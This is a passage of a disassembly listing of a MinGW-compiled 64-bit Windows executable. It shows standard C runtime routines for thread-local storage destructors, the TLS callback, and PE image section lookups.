  40246d:	48 85 db             	test   %rbx,%rbx
  402470:	74 32                	je     4024a4 <_gnu_exception_handler+0x204>
  402472:	48 8b 3d db 6f 00 00 	mov    0x6fdb(%rip),%rdi        # 409454 <__imp_TlsGetValue>
  402479:	48 8b 35 4c 6f 00 00 	mov    0x6f4c(%rip),%rsi        # 4093cc <__imp_GetLastError>
  402480:	8b 0b                	mov    (%rbx),%ecx
  402482:	ff d7                	call   *%rdi
  402484:	49 89 c4             	mov    %rax,%r12
  402487:	ff d6                	call   *%rsi
  402489:	85 c0                	test   %eax,%eax
  40248b:	75 0e                	jne    40249b <_gnu_exception_handler+0x1fb>
  40248d:	4d 85 e4             	test   %r12,%r12
  402490:	74 09                	je     40249b <_gnu_exception_handler+0x1fb>
  402492:	48 8b 43 08          	mov    0x8(%rbx),%rax
  402496:	4c 89 e1             	mov    %r12,%rcx
  402499:	ff d0                	call   *%rax
  40249b:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
  40249f:	48 85 db             	test   %rbx,%rbx
  4024a2:	75 dc                	jne    402480 <_gnu_exception_handler+0x1e0>
  4024a4:	48 8d 0d 55 64 00 00 	lea    0x6455(%rip),%rcx        # 408900 <__mingw_oldexcpt_handler+0x2c0>
  4024ab:	48 83 c4 28          	add    $0x28,%rsp
  4024af:	5b                   	pop    %rbx
  4024b0:	5e                   	pop    %rsi
  4024b1:	5f                   	pop    %rdi
  4024b2:	41 5c                	pop    %r12
  4024b4:	48 ff 25 41 6f 00 00 	rex.W jmp *0x6f41(%rip)        # 4093fc <__imp_LeaveCriticalSection>
  4024bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000004024c0 <___w64_mingwthr_add_key_dtor>:
  4024c0:	57                   	push   %rdi
  4024c1:	56                   	push   %rsi
  4024c2:	53                   	push   %rbx
  4024c3:	48 83 ec 20          	sub    $0x20,%rsp
  4024c7:	8b 05 1b 64 00 00    	mov    0x641b(%rip),%eax        # 4088e8 <__mingw_oldexcpt_handler+0x2a8>
  4024cd:	89 cf                	mov    %ecx,%edi
  4024cf:	48 89 d6             	mov    %rdx,%rsi
  4024d2:	85 c0                	test   %eax,%eax
  4024d4:	75 0a                	jne    4024e0 <___w64_mingwthr_add_key_dtor+0x20>
  4024d6:	48 83 c4 20          	add    $0x20,%rsp
  4024da:	5b                   	pop    %rbx
  4024db:	5e                   	pop    %rsi
  4024dc:	5f                   	pop    %rdi
  4024dd:	c3                   	ret
  4024de:	66 90                	xchg   %ax,%ax
  4024e0:	ba 18 00 00 00       	mov    $0x18,%edx
  4024e5:	b9 01 00 00 00       	mov    $0x1,%ecx
  4024ea:	e8 49 0d 00 00       	call   403238 <calloc>
  4024ef:	48 89 c3             	mov    %rax,%rbx
  4024f2:	48 85 c0             	test   %rax,%rax
  4024f5:	74 3c                	je     402533 <___w64_mingwthr_add_key_dtor+0x73>
  4024f7:	89 38                	mov    %edi,(%rax)
  4024f9:	48 8d 0d 00 64 00 00 	lea    0x6400(%rip),%rcx        # 408900 <__mingw_oldexcpt_handler+0x2c0>
  402500:	48 89 70 08          	mov    %rsi,0x8(%rax)
  402504:	ff 15 a2 6e 00 00    	call   *0x6ea2(%rip)        # 4093ac <__imp_EnterCriticalSection>
  40250a:	48 8b 05 cf 63 00 00 	mov    0x63cf(%rip),%rax        # 4088e0 <__mingw_oldexcpt_handler+0x2a0>
  402511:	48 8d 0d e8 63 00 00 	lea    0x63e8(%rip),%rcx        # 408900 <__mingw_oldexcpt_handler+0x2c0>
  402518:	48 89 1d c1 63 00 00 	mov    %rbx,0x63c1(%rip)        # 4088e0 <__mingw_oldexcpt_handler+0x2a0>
  40251f:	48 89 43 10          	mov    %rax,0x10(%rbx)
  402523:	ff 15 d3 6e 00 00    	call   *0x6ed3(%rip)        # 4093fc <__imp_LeaveCriticalSection>
  402529:	31 c0                	xor    %eax,%eax
  40252b:	48 83 c4 20          	add    $0x20,%rsp
  40252f:	5b                   	pop    %rbx
  402530:	5e                   	pop    %rsi
  402531:	5f                   	pop    %rdi
  402532:	c3                   	ret
  402533:	83 c8 ff             	or     $0xffffffff,%eax
  402536:	eb 9e                	jmp    4024d6 <___w64_mingwthr_add_key_dtor+0x16>
  402538:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40253f:	00 

0000000000402540 <___w64_mingwthr_remove_key_dtor>:
  402540:	53                   	push   %rbx
  402541:	48 83 ec 20          	sub    $0x20,%rsp
  402545:	8b 05 9d 63 00 00    	mov    0x639d(%rip),%eax        # 4088e8 <__mingw_oldexcpt_handler+0x2a8>
  40254b:	89 cb                	mov    %ecx,%ebx
  40254d:	85 c0                	test   %eax,%eax
  40254f:	75 0f                	jne    402560 <___w64_mingwthr_remove_key_dtor+0x20>
  402551:	31 c0                	xor    %eax,%eax
  402553:	48 83 c4 20          	add    $0x20,%rsp
  402557:	5b                   	pop    %rbx
  402558:	c3                   	ret
  402559:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402560:	48 8d 0d 99 63 00 00 	lea    0x6399(%rip),%rcx        # 408900 <__mingw_oldexcpt_handler+0x2c0>
  402567:	ff 15 3f 6e 00 00    	call   *0x6e3f(%rip)        # 4093ac <__imp_EnterCriticalSection>
  40256d:	48 8b 0d 6c 63 00 00 	mov    0x636c(%rip),%rcx        # 4088e0 <__mingw_oldexcpt_handler+0x2a0>
  402574:	48 85 c9             	test   %rcx,%rcx
  402577:	74 2a                	je     4025a3 <___w64_mingwthr_remove_key_dtor+0x63>
  402579:	31 d2                	xor    %edx,%edx
  40257b:	eb 0e                	jmp    40258b <___w64_mingwthr_remove_key_dtor+0x4b>
  40257d:	0f 1f 00             	nopl   (%rax)
  402580:	48 89 ca             	mov    %rcx,%rdx
  402583:	48 85 c0             	test   %rax,%rax
  402586:	74 1b                	je     4025a3 <___w64_mingwthr_remove_key_dtor+0x63>
  402588:	48 89 c1             	mov    %rax,%rcx
  40258b:	8b 01                	mov    (%rcx),%eax
  40258d:	39 d8                	cmp    %ebx,%eax
  40258f:	48 8b 41 10          	mov    0x10(%rcx),%rax
  402593:	75 eb                	jne    402580 <___w64_mingwthr_remove_key_dtor+0x40>
  402595:	48 85 d2             	test   %rdx,%rdx
  402598:	74 26                	je     4025c0 <___w64_mingwthr_remove_key_dtor+0x80>
  40259a:	48 89 42 10          	mov    %rax,0x10(%rdx)
  40259e:	e8 9d 0c 00 00       	call   403240 <free>
  4025a3:	48 8d 0d 56 63 00 00 	lea    0x6356(%rip),%rcx        # 408900 <__mingw_oldexcpt_handler+0x2c0>
  4025aa:	ff 15 4c 6e 00 00    	call   *0x6e4c(%rip)        # 4093fc <__imp_LeaveCriticalSection>
  4025b0:	31 c0                	xor    %eax,%eax
  4025b2:	48 83 c4 20          	add    $0x20,%rsp
  4025b6:	5b                   	pop    %rbx
  4025b7:	c3                   	ret
  4025b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4025bf:	00 
  4025c0:	48 89 05 19 63 00 00 	mov    %rax,0x6319(%rip)        # 4088e0 <__mingw_oldexcpt_handler+0x2a0>
  4025c7:	eb d5                	jmp    40259e <___w64_mingwthr_remove_key_dtor+0x5e>
  4025c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000004025d0 <__mingw_TLScallback>:
  4025d0:	53                   	push   %rbx
  4025d1:	48 83 ec 20          	sub    $0x20,%rsp
  4025d5:	83 fa 02             	cmp    $0x2,%edx
  4025d8:	0f 84 c2 00 00 00    	je     4026a0 <__mingw_TLScallback+0xd0>
  4025de:	77 28                	ja     402608 <__mingw_TLScallback+0x38>
  4025e0:	85 d2                	test   %edx,%edx
  4025e2:	74 4c                	je     402630 <__mingw_TLScallback+0x60>
  4025e4:	8b 05 fe 62 00 00    	mov    0x62fe(%rip),%eax        # 4088e8 <__mingw_oldexcpt_handler+0x2a8>
  4025ea:	85 c0                	test   %eax,%eax
  4025ec:	74 32                	je     402620 <__mingw_TLScallback+0x50>
  4025ee:	c7 05 f0 62 00 00 01 	movl   $0x1,0x62f0(%rip)        # 4088e8 <__mingw_oldexcpt_handler+0x2a8>
  4025f5:	00 00 00 
  4025f8:	b8 01 00 00 00       	mov    $0x1,%eax
  4025fd:	48 83 c4 20          	add    $0x20,%rsp
  402601:	5b                   	pop    %rbx
  402602:	c3                   	ret
  402603:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402608:	83 fa 03             	cmp    $0x3,%edx
  40260b:	75 eb                	jne    4025f8 <__mingw_TLScallback+0x28>
  40260d:	8b 05 d5 62 00 00    	mov    0x62d5(%rip),%eax        # 4088e8 <__mingw_oldexcpt_handler+0x2a8>
  402613:	85 c0                	test   %eax,%eax
  402615:	74 e1                	je     4025f8 <__mingw_TLScallback+0x28>
  402617:	e8 34 fe ff ff       	call   402450 <_gnu_exception_handler+0x1b0>
  40261c:	eb da                	jmp    4025f8 <__mingw_TLScallback+0x28>
  40261e:	66 90                	xchg   %ax,%ax
  402620:	48 8d 0d d9 62 00 00 	lea    0x62d9(%rip),%rcx        # 408900 <__mingw_oldexcpt_handler+0x2c0>
  402627:	ff 15 c7 6d 00 00    	call   *0x6dc7(%rip)        # 4093f4 <__imp_InitializeCriticalSection>
  40262d:	eb bf                	jmp    4025ee <__mingw_TLScallback+0x1e>
  40262f:	90                   	nop
  402630:	8b 05 b2 62 00 00    	mov    0x62b2(%rip),%eax        # 4088e8 <__mingw_oldexcpt_handler+0x2a8>
  402636:	85 c0                	test   %eax,%eax
  402638:	74 05                	je     40263f <__mingw_TLScallback+0x6f>
  40263a:	e8 11 fe ff ff       	call   402450 <_gnu_exception_handler+0x1b0>
  40263f:	8b 05 a3 62 00 00    	mov    0x62a3(%rip),%eax        # 4088e8 <__mingw_oldexcpt_handler+0x2a8>
  402645:	83 f8 01             	cmp    $0x1,%eax
  402648:	75 ae                	jne    4025f8 <__mingw_TLScallback+0x28>
  40264a:	48 8b 1d 8f 62 00 00 	mov    0x628f(%rip),%rbx        # 4088e0 <__mingw_oldexcpt_handler+0x2a0>
  402651:	48 85 db             	test   %rbx,%rbx
  402654:	74 1b                	je     402671 <__mingw_TLScallback+0xa1>
  402656:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40265d:	00 00 00 
  402660:	48 89 d9             	mov    %rbx,%rcx
  402663:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
  402667:	e8 d4 0b 00 00       	call   403240 <free>
  40266c:	48 85 db             	test   %rbx,%rbx
  40266f:	75 ef                	jne    402660 <__mingw_TLScallback+0x90>
  402671:	48 8d 0d 88 62 00 00 	lea    0x6288(%rip),%rcx        # 408900 <__mingw_oldexcpt_handler+0x2c0>
  402678:	48 c7 05 5d 62 00 00 	movq   $0x0,0x625d(%rip)        # 4088e0 <__mingw_oldexcpt_handler+0x2a0>
  40267f:	00 00 00 00 
  402683:	c7 05 5b 62 00 00 00 	movl   $0x0,0x625b(%rip)        # 4088e8 <__mingw_oldexcpt_handler+0x2a8>
  40268a:	00 00 00 
  40268d:	ff 15 11 6d 00 00    	call   *0x6d11(%rip)        # 4093a4 <__IAT_start__>
  402693:	e9 60 ff ff ff       	jmp    4025f8 <__mingw_TLScallback+0x28>
  402698:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40269f:	00 
  4026a0:	e8 5b f3 ff ff       	call   401a00 <_fpreset>
  4026a5:	b8 01 00 00 00       	mov    $0x1,%eax
  4026aa:	48 83 c4 20          	add    $0x20,%rsp
  4026ae:	5b                   	pop    %rbx
  4026af:	c3                   	ret
  4026b0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  4026b4:	48 8d 14 08          	lea    (%rax,%rcx,1),%rdx
  4026b8:	31 c0                	xor    %eax,%eax
  4026ba:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
  4026c0:	75 0b                	jne    4026cd <__mingw_TLScallback+0xfd>
  4026c2:	31 c0                	xor    %eax,%eax
  4026c4:	66 81 7a 18 0b 02    	cmpw   $0x20b,0x18(%rdx)
  4026ca:	0f 94 c0             	sete   %al
  4026cd:	c3                   	ret
  4026ce:	66 90                	xchg   %ax,%ax

00000000004026d0 <_ValidateImageBase>:
  4026d0:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  4026d5:	75 09                	jne    4026e0 <_ValidateImageBase+0x10>
  4026d7:	eb d7                	jmp    4026b0 <__mingw_TLScallback+0xe0>
  4026d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4026e0:	31 c0                	xor    %eax,%eax
  4026e2:	c3                   	ret
  4026e3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  4026ea:	00 00 00 00 
  4026ee:	66 90                	xchg   %ax,%ax

00000000004026f0 <_FindPESection>:
  4026f0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  4026f4:	48 01 c1             	add    %rax,%rcx
  4026f7:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  4026fb:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
  402700:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  402704:	85 c9                	test   %ecx,%ecx
  402706:	74 2d                	je     402735 <_FindPESection+0x45>
  402708:	83 e9 01             	sub    $0x1,%ecx
  40270b:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  40270f:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
  402714:	0f 1f 40 00          	nopl   0x0(%rax)
  402718:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  40271c:	4c 89 c1             	mov    %r8,%rcx
  40271f:	49 39 d0             	cmp    %rdx,%r8
  402722:	77 08                	ja     40272c <_FindPESection+0x3c>
  402724:	03 48 08             	add    0x8(%rax),%ecx
  402727:	48 39 d1             	cmp    %rdx,%rcx
  40272a:	77 0b                	ja     402737 <_FindPESection+0x47>
  40272c:	48 83 c0 28          	add    $0x28,%rax
  402730:	4c 39 c8             	cmp    %r9,%rax
  402733:	75 e3                	jne    402718 <_FindPESection+0x28>
  402735:	31 c0                	xor    %eax,%eax
  402737:	c3                   	ret
  402738:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40273f:	00 

0000000000402740 <_FindPESectionByName>:
  402740:	41 54                	push   %r12
  402742:	56                   	push   %rsi
  402743:	53                   	push   %rbx
  402744:	48 83 ec 20          	sub    $0x20,%rsp
  402748:	48 89 cb             	mov    %rcx,%rbx
  40274b:	e8 e0 09 00 00       	call   403130 <strlen>
  402750:	48 83 f8 08          	cmp    $0x8,%rax
  402754:	77 7a                	ja     4027d0 <_FindPESectionByName+0x90>
  402756:	48 8b 0d e3 2c 00 00 	mov    0x2ce3(%rip),%rcx        # 405440 <.refptr.__image_base__>
  40275d:	45 31 e4             	xor    %r12d,%r12d
  402760:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  402765:	75 57                	jne    4027be <_FindPESectionByName+0x7e>
  402767:	e8 44 ff ff ff       	call   4026b0 <__mingw_TLScallback+0xe0>
  40276c:	85 c0                	test   %eax,%eax
  40276e:	74 4e                	je     4027be <_FindPESectionByName+0x7e>
  402770:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  402774:	48 01 c1             	add    %rax,%rcx
  402777:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  40277b:	4c 8d 64 01 18       	lea    0x18(%rcx,%rax,1),%r12
  402780:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
  402784:	85 c0                	test   %eax,%eax
  402786:	74 48                	je     4027d0 <_FindPESectionByName+0x90>
  402788:	83 e8 01             	sub    $0x1,%eax
  40278b:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  40278f:	49 8d 74 c4 28       	lea    0x28(%r12,%rax,8),%rsi
  402794:	eb 13                	jmp    4027a9 <_FindPESectionByName+0x69>
  402796:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40279d:	00 00 00 
  4027a0:	49 83 c4 28          	add    $0x28,%r12
  4027a4:	49 39 f4             	cmp    %rsi,%r12
  4027a7:	74 27                	je     4027d0 <_FindPESectionByName+0x90>
  4027a9:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  4027af:	48 89 da             	mov    %rbx,%rdx
  4027b2:	4c 89 e1             	mov    %r12,%rcx
  4027b5:	e8 7e 09 00 00       	call   403138 <strncmp>
  4027ba:	85 c0                	test   %eax,%eax
  4027bc:	75 e2                	jne    4027a0 <_FindPESectionByName+0x60>
  4027be:	4c 89 e0             	mov    %r12,%rax
  4027c1:	48 83 c4 20          	add    $0x20,%rsp
  4027c5:	5b                   	pop    %rbx
  4027c6:	5e                   	pop    %rsi
  4027c7:	41 5c                	pop    %r12
  4027c9:	c3                   	ret
  4027ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4027d0:	45 31 e4             	xor    %r12d,%r12d
  4027d3:	4c 89 e0             	mov    %r12,%rax
  4027d6:	48 83 c4 20          	add    $0x20,%rsp
  4027da:	5b                   	pop    %rbx
  4027db:	5e                   	pop    %rsi
  4027dc:	41 5c                	pop    %r12
  4027de:	c3                   	ret
  4027df:	90                   	nop

00000000004027e0 <__mingw_GetSectionForAddress>:
  4027e0:	48 83 ec 28          	sub    $0x28,%rsp
  4027e4:	4c 8b 15 55 2c 00 00 	mov    0x2c55(%rip),%r10        # 405440 <.refptr.__image_base__>
  4027eb:	45 31 c0             	xor    %r8d,%r8d
  4027ee:	66 41 81 3a 4d 5a    	cmpw   $0x5a4d,(%r10)
  4027f4:	49 89 c9             	mov    %rcx,%r9
  4027f7:	75 60                	jne    402859 <__mingw_GetSectionForAddress+0x79>
  4027f9:	4c 89 d1             	mov    %r10,%rcx
  4027fc:	e8 af fe ff ff       	call   4026b0 <__mingw_TLScallback+0xe0>
  402801:	85 c0                	test   %eax,%eax
  402803:	74 54                	je     402859 <__mingw_GetSectionForAddress+0x79>
  402805:	49 63 42 3c          	movslq 0x3c(%r10),%rax
  402809:	4c 89 c9             	mov    %r9,%rcx
  40280c:	4c 29 d1             	sub    %r10,%rcx
  40280f:	49 01 c2             	add    %rax,%r10
  402812:	41 0f b7 42 14       	movzwl 0x14(%r10),%eax
  402817:	4d 8d 44 02 18       	lea    0x18(%r10,%rax,1),%r8
  40281c:	41 0f b7 42 06       	movzwl 0x6(%r10),%eax
  402821:	85 c0                	test   %eax,%eax
  402823:	74 31                	je     402856 <__mingw_GetSectionForAddress+0x76>
  402825:	83 e8 01             	sub    $0x1,%eax
  402828:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  40282c:	4d 8d 4c c0 28       	lea    0x28(%r8,%rax,8),%r9
  402831:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402838:	41 8b 50 0c          	mov    0xc(%r8),%edx
  40283c:	48 89 d0             	mov    %rdx,%rax
  40283f:	48 39 d1             	cmp    %rdx,%rcx
  402842:	72 09                	jb     40284d <__mingw_GetSectionForAddress+0x6d>
  402844:	41 03 40 08          	add    0x8(%r8),%eax
  402848:	48 39 c1             	cmp    %rax,%rcx
  40284b:	72 0c                	jb     402859 <__mingw_GetSectionForAddress+0x79>
  40284d:	49 83 c0 28          	add    $0x28,%r8
  402851:	4d 39 c8             	cmp    %r9,%r8
  402854:	75 e2                	jne    402838 <__mingw_GetSectionForAddress+0x58>
  402856:	45 31 c0             	xor    %r8d,%r8d
  402859:	4c 89 c0             	mov    %r8,%rax
  40285c:	48 83 c4 28          	add    $0x28,%rsp
  402860:	c3                   	ret
  402861:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  402868:	00 00 00 00 
  40286c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000402870 <__mingw_GetSectionCount>:
  402870:	48 83 ec 28          	sub    $0x28,%rsp
  402874:	48 8b 0d c5 2b 00 00 	mov    0x2bc5(%rip),%rcx        # 405440 <.refptr.__image_base__>
  40287b:	31 c0                	xor    %eax,%eax
  40287d:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  402882:	75 12                	jne    402896 <__mingw_GetSectionCount+0x26>
  402884:	e8 27 fe ff ff       	call   4026b0 <__mingw_TLScallback+0xe0>
  402889:	85 c0                	test   %eax,%eax
  40288b:	74 09                	je     402896 <__mingw_GetSectionCount+0x26>
  40288d:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  402891:	0f b7 44 08 06       	movzwl 0x6(%rax,%rcx,1),%eax
  402896:	48 83 c4 28          	add    $0x28,%rsp
  40289a:	c3                   	ret
  40289b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000004028a0 <_FindPESectionExec>:
  4028a0:	48 83 ec 28          	sub    $0x28,%rsp
  4028a4:	45 31 c0             	xor    %r8d,%r8d
  4028a7:	49 89 c9             	mov    %rcx,%r9
  4028aa:	48 8b 0d 8f 2b 00 00 	mov    0x2b8f(%rip),%rcx        # 405440 <.refptr.__image_base__>
  4028b1:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  4028b6:	75 4c                	jne    402904 <_FindPESectionExec+0x64>
  4028b8:	e8 f3 fd ff ff       	call   4026b0 <__mingw_TLScallback+0xe0>
  4028bd:	85 c0                	test   %eax,%eax
  4028bf:	74 43                	je     402904 <_FindPESectionExec+0x64>
  4028c1:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  4028c5:	48 01 c1             	add    %rax,%rcx
  4028c8:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  4028cc:	4c 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%r8
  4028d1:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
  4028d5:	85 c0                	test   %eax,%eax
  4028d7:	74 28                	je     402901 <_FindPESectionExec+0x61>
  4028d9:	83 e8 01             	sub    $0x1,%eax
  4028dc:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  4028e0:	49 8d 44 c0 28       	lea    0x28(%r8,%rax,8),%rax
  4028e5:	0f 1f 00             	nopl   (%rax)
  4028e8:	41 f6 40 27 20       	testb  $0x20,0x27(%r8)
  4028ed:	74 09                	je     4028f8 <_FindPESectionExec+0x58>
  4028ef:	4d 85 c9             	test   %r9,%r9
  4028f2:	74 10                	je     402904 <_FindPESectionExec+0x64>
  4028f4:	49 83 e9 01          	sub    $0x1,%r9
  4028f8:	49 83 c0 28          	add    $0x28,%r8
  4028fc:	49 39 c0             	cmp    %rax,%r8
  4028ff:	75 e7                	jne    4028e8 <_FindPESectionExec+0x48>
  402901:	45 31 c0             	xor    %r8d,%r8d
  402904:	4c 89 c0             	mov    %r8,%rax
  402907:	48 83 c4 28          	add    $0x28,%rsp
  40290b:	c3                   	ret
  40290c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000402910 <_GetPEImageBase>:
  402910:	48 83 ec 28          	sub    $0x28,%rsp
  402914:	48 8b 0d 25 2b 00 00 	mov    0x2b25(%rip),%rcx        # 405440 <.refptr.__image_base__>
  40291b:	45 31 c0             	xor    %r8d,%r8d
  40291e:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  402923:	75 0b                	jne    402930 <_GetPEImageBase+0x20>
  402925:	e8 86 fd ff ff       	call   4026b0 <__mingw_TLScallback+0xe0>
  40292a:	85 c0                	test   %eax,%eax
  40292c:	4c 0f 45 c1          	cmovne %rcx,%r8
  402930:	4c 89 c0             	mov    %r8,%rax
  402933:	48 83 c4 28          	add    $0x28,%rsp
  402937:	c3                   	ret
  402938:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40293f:	00 

0000000000402940 <_IsNonwritableInCurrentImage>:
  402940:	48 83 ec 28          	sub    $0x28,%rsp
  402944:	4c 8b 0d f5 2a 00 00 	mov    0x2af5(%rip),%r9        # 405440 <.refptr.__image_base__>
  40294b:	31 c0                	xor    %eax,%eax
  40294d:	66 41 81 39 4d 5a    	cmpw   $0x5a4d,(%r9)
  402953:	49 89 c8             	mov    %rcx,%r8
  402956:	75 57                	jne    4029af <_IsNonwritableInCurrentImage+0x6f>
  402958:	4c 89 c9             	mov    %r9,%rcx
  40295b:	e8 50 fd ff ff       	call   4026b0 <__mingw_TLScallback+0xe0>
  402960:	85 c0                	test   %eax,%eax
  402962:	74 4b                	je     4029af <_IsNonwritableInCurrentImage+0x6f>
  402964:	49 63 41 3c          	movslq 0x3c(%r9),%rax
  402968:	4c 89 c1             	mov    %r8,%rcx
  40296b:	4c 29 c9             	sub    %r9,%rcx
  40296e:	49 01 c1             	add    %rax,%r9
  402971:	41 0f b7 41 14       	movzwl 0x14(%r9),%eax
  402976:	41 0f b7 51 06       	movzwl 0x6(%r9),%edx
  40297b:	49 8d 44 01 18       	lea    0x18(%r9,%rax,1),%rax
  402980:	85 d2                	test   %edx,%edx
  402982:	74 29                	je     4029ad <_IsNonwritableInCurrentImage+0x6d>
  402984:	83 ea 01             	sub    $0x1,%edx
  402987:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  40298b:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
  402990:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  402994:	4c 89 c2             	mov    %r8,%rdx
  402997:	4c 39 c1             	cmp    %r8,%rcx
  40299a:	72 08                	jb     4029a4 <_IsNonwritableInCurrentImage+0x64>
  40299c:	03 50 08             	add    0x8(%rax),%edx
  40299f:	48 39 d1             	cmp    %rdx,%rcx
  4029a2:	72 14                	jb     4029b8 <_IsNonwritableInCurrentImage+0x78>
  4029a4:	48 83 c0 28          	add    $0x28,%rax
  4029a8:	4c 39 c8             	cmp    %r9,%rax
  4029ab:	75 e3                	jne    402990 <_IsNonwritableInCurrentImage+0x50>
  4029ad:	31 c0                	xor    %eax,%eax
  4029af:	48 83 c4 28          	add    $0x28,%rsp
  4029b3:	c3                   	ret
  4029b4:	0f 1f 40 00          	nopl   0x0(%rax)
  4029b8:	8b 40 24             	mov    0x24(%rax),%eax
  4029bb:	f7 d0                	not    %eax
  4029bd:	c1 e8 1f             	shr    $0x1f,%eax
  4029c0:	48 83 c4 28          	add    $0x28,%rsp
  4029c4:	c3                   	ret
  4029c5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  4029cc:	00 00 00 00 

00000000004029d0 <__mingw_enum_import_library_names>:
  4029d0:	48 83 ec 28          	sub    $0x28,%rsp
  4029d4:	4c 8b 1d 65 2a 00 00 	mov    0x2a65(%rip),%r11        # 405440 <.refptr.__image_base__>
  4029db:	45 31 c9             	xor    %r9d,%r9d
  4029de:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
  4029e4:	41 89 c8             	mov    %ecx,%r8d
  4029e7:	75 5f                	jne    402a48 <__mingw_enum_import_library_names+0x78>
  4029e9:	4c 89 d9             	mov    %r11,%rcx
  4029ec:	e8 bf fc ff ff       	call   4026b0 <__mingw_TLScallback+0xe0>
  4029f1:	85 c0                	test   %eax,%eax
  4029f3:	74 53                	je     402a48 <__mingw_enum_import_library_names+0x78>
  4029f5:	49 63 4b 3c          	movslq 0x3c(%r11),%rcx
  4029f9:	4c 01 d9             	add    %r11,%rcx
  4029fc:	8b 81 90 00 00 00    	mov    0x90(%rcx),%eax
  402a02:	85 c0                	test   %eax,%eax
  402a04:	74 42                	je     402a48 <__mingw_enum_import_library_names+0x78>
  402a06:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
  402a0a:	48 8d 54 11 18       	lea    0x18(%rcx,%rdx,1),%rdx
  402a0f:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  402a13:	85 c9                	test   %ecx,%ecx
  402a15:	74 31                	je     402a48 <__mingw_enum_import_library_names+0x78>
  402a17:	83 e9 01             	sub    $0x1,%ecx
  402a1a:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  402a1e:	4c 8d 54 ca 28       	lea    0x28(%rdx,%rcx,8),%r10
  402a23:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402a28:	44 8b 4a 0c          	mov    0xc(%rdx),%r9d
  402a2c:	4c 89 c9             	mov    %r9,%rcx
  402a2f:	4c 39 c8             	cmp    %r9,%rax
  402a32:	72 08                	jb     402a3c <__mingw_enum_import_library_names+0x6c>
  402a34:	03 4a 08             	add    0x8(%rdx),%ecx
  402a37:	48 39 c8             	cmp    %rcx,%rax
  402a3a:	72 14                	jb     402a50 <__mingw_enum_import_library_names+0x80>
  402a3c:	48 83 c2 28          	add    $0x28,%rdx
  402a40:	4c 39 d2             	cmp    %r10,%rdx
  402a43:	75 e3                	jne    402a28 <__mingw_enum_import_library_names+0x58>
  402a45:	45 31 c9             	xor    %r9d,%r9d
  402a48:	4c 89 c8             	mov    %r9,%rax
  402a4b:	48 83 c4 28          	add    $0x28,%rsp
  402a4f:	c3                   	ret
  402a50:	4c 01 d8             	add    %r11,%rax
  402a53:	eb 0b                	jmp    402a60 <__mingw_enum_import_library_names+0x90>
  402a55:	0f 1f 00             	nopl   (%rax)
  402a58:	41 83 e8 01          	sub    $0x1,%r8d
  402a5c:	48 83 c0 14          	add    $0x14,%rax
  402a60:	8b 48 04             	mov    0x4(%rax),%ecx
  402a63:	85 c9                	test   %ecx,%ecx
  402a65:	75 07                	jne    402a6e <__mingw_enum_import_library_names+0x9e>
  402a67:	8b 50 0c             	mov    0xc(%rax),%edx
  402a6a:	85 d2                	test   %edx,%edx
  402a6c:	74 d7                	je     402a45 <__mingw_enum_import_library_names+0x75>
  402a6e:	45 85 c0             	test   %r8d,%r8d
  402a71:	7f e5                	jg     402a58 <__mingw_enum_import_library_names+0x88>
